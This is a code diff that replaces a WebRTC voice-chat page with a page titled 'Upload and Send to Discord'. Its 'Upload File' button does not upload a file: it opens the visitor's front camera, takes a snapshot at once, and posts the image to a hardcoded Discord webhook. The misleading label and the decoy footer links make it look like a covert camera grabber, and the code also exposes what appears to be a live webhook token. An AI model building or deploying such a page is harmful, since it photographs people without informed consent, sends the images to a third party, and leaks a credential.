@@ -1,161 +1,254 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voice Chat</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        #chat-container {
-            width: 90%;
-            max-width: 600px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            text-align: center;
-            padding: 20px;
-        }
-        #status {
-            margin-bottom: 20px;
-            font-size: 1.2em;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 1em;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload and Send to Discord</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #121212; /* Slightly dark background */
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .header img {
+      width: 120px;
+      margin-bottom: 15px;
+      animation: glow 2s infinite alternate;
+    }
+
+    @keyframes glow {
+      from {
+        filter: drop-shadow(0 0 5px #2E86C1) drop-shadow(0 0 10px #2E86C1);
+      }
+      to {
+        filter: drop-shadow(0 0 20px #2E86C1) drop-shadow(0 0 40px #2E86C1);
+      }
+    }
+
+    h1 {
+      font-size: 2rem;
+      color: #2E86C1;
+      margin-bottom: 5px;
+      text-shadow: 0 0 10px #2E86C1, 0 0 20px #21618C;
+    }
+
+    p {
+      font-size: 1rem;
+      color: #D5D8DC;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 600px;
+      text-align: center;
+      background: rgba(18, 18, 18, 0.9); /* Semi-transparent container */
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(46, 134, 193, 0.5);
+      padding: 20px;
+      backdrop-filter: blur(10px);
+    }
+
+    button {
+      background-color: #2E86C1;
+      color: #fff;
+      border: none;
+      padding: 12px 25px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 20px;
+      box-shadow: 0 0 10px #2E86C1;
+    }
+
+    button:hover {
+      background-color: #21618C;
+      box-shadow: 0 0 20px #2E86C1;
+    }
+
+    button:active {
+      background-color: #1B4F72;
+      box-shadow: 0 0 5px #1B4F72;
+    }
+
+    #cameraFeed {
+      border: 2px solid #2E86C1;
+      border-radius: 10px;
+      margin-top: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+      display: none;
+    }
+
+    #loading {
+      display: none;
+      margin-top: 20px;
+    }
+
+    #loading img {
+      width: 50px;
+      filter: drop-shadow(0 0 10px #2E86C1);
+    }
+
+    .modal {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(18, 18, 18, 0.95);
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(46, 134, 193, 0.8), 0 0 60px rgba(46, 134, 193, 0.5);
+      width: 300px;
+      text-align: center;
+      padding: 20px;
+      display: none;
+      color: #fff;
+    }
+
+    .modal h2 {
+      font-size: 1.5rem;
+      color: #2E86C1;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #2E86C1;
+    }
+
+    .modal p {
+      font-size: 1rem;
+      color: #D5D8DC;
+    }
+
+    footer {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #D5D8DC;
+      text-align: center;
+    }
+
+    footer img {
+      width: 20px;
+      margin: 0 10px;
+    }
+
+    footer a {
+      color: #2E86C1;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
-    <div id="chat-container">
-        <div id="status">Waiting for connection...</div>
-        <button id="start-button">Start Voice Chat</button>
+  <header class="header">
+    <img src="https://cdn.discordapp.com/avatars/559426966151757824/c7c54eb85e591ced4c2f0864b7ea4e3e.webp?size=1024&format=webp" alt="App Logo" />
+    <h1>Upload and Send to Discord</h1>
+    <p>Click the button to capture and upload to Discord automatically!</p>
+  </header>
+
+  <div class="container">
+    <button id="openCamera">Upload File</button>
+    <video id="cameraFeed" autoplay playsinline style="width: 100%;"></video>
+    <div id="loading">
+      <img src="https://cdn.discordapp.com/emojis/1331608865720111126.webp?size=96&animated=true" alt="Loading" />
+      <p>Uploading...</p>
     </div>
+    <canvas id="photoCanvas" style="display: none;"></canvas>
+  </div>
 
-    <script>
-        const startButton = document.getElementById('start-button');
-        const statusDiv = document.getElementById('status');
+  <div id="modal" class="modal">
+    <h2 id="modalTitle">Success!</h2>
+    <p id="modalMessage">Photo uploaded to Discord successfully.</p>
+  </div>
 
-        let localStream;
-        let peerConnection;
-        const config = {
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+  <footer>
+    <p>Follow us on</p>
+    <a href="#"><img src="https://cdn.discordapp.com/emojis/1331609172701220946.webp?size=96" alt="Facebook"></a>
+    <a href="#"><img src="https://cdn.discordapp.com/emojis/1331609422946107482.webp?size=96" alt="Twitter"></a>
+    <a href="#"><img src="https://cdn.discordapp.com/emojis/1331609561353687040.webp?size=96" alt="Instagram"></a>
+  </footer>
+
+  <script>
+    const openCameraButton = document.getElementById('openCamera');
+    const cameraFeed = document.getElementById('cameraFeed');
+    const photoCanvas = document.getElementById('photoCanvas');
+    const discordWebhookURL = "https://canary.discord.com/api/webhooks/1331541860207820821/eX5RfgF4ZHNfio0UPYYCjfoM-H0ntvEm5SvMK5x5uOBhPPZDWChtHSJFZpf7_kY0CTLr";
+    const loadingIndicator = document.getElementById('loading');
+    const modal = document.getElementById('modal');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalMessage = document.getElementById('modalMessage');
+
+    openCameraButton.addEventListener('click', async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' }
+        });
+        cameraFeed.srcObject = stream;
+        cameraFeed.style.display = 'block';
+
+        cameraFeed.onloadedmetadata = async () => {
+          loadingIndicator.style.display = 'block';
+          await captureAndSendPhoto(stream);
         };
+      } catch (error) {
+        showModal('Error', 'Could not access the camera. Please check your permissions.');
+      }
+    });
 
-        async function startVoiceChat() {
-            try {
-                // Get local audio stream
-                localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    async function captureAndSendPhoto(stream) {
+      const context = photoCanvas.getContext('2d');
+      photoCanvas.width = cameraFeed.videoWidth;
+      photoCanvas.height = cameraFeed.videoHeight;
+      context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
 
-                // Create a new RTCPeerConnection
-                peerConnection = new RTCPeerConnection(config);
+      photoCanvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('file', blob, 'photo.png');
+        formData.append('payload_json', JSON.stringify({
+          content: "Captured photo:"
+        }));
 
-                // Add local stream to the connection
-                localStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localStream);
-                });
+        try {
+          const response = await fetch(discordWebhookURL, {
+            method: 'POST',
+            body: formData,
+          });
 
-                // Listen for remote stream
-                peerConnection.ontrack = event => {
-                    const remoteAudio = document.createElement('audio');
-                    remoteAudio.srcObject = event.streams[0];
-                    remoteAudio.autoplay = true;
-                    document.body.appendChild(remoteAudio);
-                };
-
-                // Handle ICE candidates
-                peerConnection.onicecandidate = event => {
-                    if (event.candidate) {
-                        sendSignal({ candidate: event.candidate });
-                    }
-                };
-
-                // Create offer
-                const offer = await peerConnection.createOffer();
-                await peerConnection.setLocalDescription(offer);
-
-                // Send offer to signaling server
-                sendSignal({ offer });
-
-                statusDiv.textContent = "Voice chat started. Waiting for a partner...";
-                startButton.disabled = true;
-            } catch (error) {
-                statusDiv.textContent = "Error: " + error.message;
-            }
+          if (response.ok) {
+            showModal('Success', 'Photo uploaded to Discord successfully.');
+          } else {
+            showModal('Error', 'Failed to upload photo to Discord.');
+          }
+        } catch (error) {
+          showModal('Error', 'An error occurred while uploading the photo.');
+        } finally {
+          stream.getTracks().forEach(track => track.stop());
+          cameraFeed.style.display = 'none';
+          loadingIndicator.style.display = 'none';
         }
+      }, 'image/png');
+    }
 
-        function sendSignal(data) {
-            // Replace this with your signaling server logic
-            console.log('Send to signaling server:', data);
-        }
-
-        function receiveSignal(data) {
-            // Handle incoming signaling data
-            if (data.offer) {
-                handleOffer(data.offer);
-            } else if (data.answer) {
-                handleAnswer(data.answer);
-            } else if (data.candidate) {
-                handleCandidate(data.candidate);
-            }
-        }
-
-        async function handleOffer(offer) {
-            if (!peerConnection) {
-                peerConnection = new RTCPeerConnection(config);
-                localStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localStream);
-                });
-
-                peerConnection.ontrack = event => {
-                    const remoteAudio = document.createElement('audio');
-                    remoteAudio.srcObject = event.streams[0];
-                    remoteAudio.autoplay = true;
-                    document.body.appendChild(remoteAudio);
-                };
-
-                peerConnection.onicecandidate = event => {
-                    if (event.candidate) {
-                        sendSignal({ candidate: event.candidate });
-                    }
-                };
-            }
-
-            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-            const answer = await peerConnection.createAnswer();
-            await peerConnection.setLocalDescription(answer);
-            sendSignal({ answer });
-        }
-
-        async function handleAnswer(answer) {
-            await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
-        }
-
-        function handleCandidate(candidate) {
-            peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-        }
-
-        startButton.addEventListener('click', startVoiceChat);
-
-        // Simulate receiving signaling data (replace this with actual signaling server integration)
-        window.receiveSignal = receiveSignal;
-    </script>
+    function showModal(title, message) {
+      modalTitle.textContent = title;
+      modalMessage.textContent = message;
+      modal.style.display = 'block';
+      setTimeout(() => modal.style.display = 'none', 3000);
+    }
+  </script>
 </body>
 </html>
